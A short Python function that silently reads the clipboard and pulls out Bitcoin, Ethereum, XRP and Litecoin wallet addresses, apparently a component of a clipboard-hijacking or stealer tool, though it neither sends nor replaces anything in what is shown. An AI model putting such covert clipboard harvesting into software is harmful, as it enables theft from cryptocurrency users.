def monitorclipboard():
    clipboard_data = []

    try:
        import pyperclip
        clipboard = pyperclip.paste()

        if clipboard:
            crypto_patterns = {
                'BTC': r'(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}',
                'ETH': r'0x[a-fA-F0-9]{40}',
                'XRP': r'r[0-9a-zA-Z]{24,34}',
                'LTC': r'(L|M)[a-km-zA-HJ-NP-Z1-9]{26,33}'
            }

            for coin, pattern in crypto_patterns.items():
                if re.search(pattern, clipboard, re.IGNORECASE):
                    clipboard_data.append({
                        'type': 'crypto_address',
                        'coin': coin,
                        'address': re.search(pattern, clipboard, re.IGNORECASE).group()
                    })

    except:
        pass

    return clipboard_data
